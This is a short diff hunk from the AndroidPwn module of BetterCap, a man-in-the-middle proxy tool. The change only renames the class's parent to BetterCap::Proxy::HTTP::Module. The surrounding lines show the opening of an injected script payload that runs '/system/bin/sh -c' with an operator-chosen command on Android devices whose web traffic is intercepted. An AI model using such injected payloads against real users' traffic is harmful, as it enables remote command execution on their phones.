@@ -9,7 +9,7 @@ Blog   : http://www.evilsocket.net/
 This project is released under the GPL 3 license.
 
 =end
-class AndroidPwn < BetterCap::Proxy::Module
+class AndroidPwn < BetterCap::Proxy::HTTP::Module
   @@command = nil
   @@payload = "<script>\n" +
               "var command = ['/system/bin/sh','-c','COMMAND_HERE'];\n" +
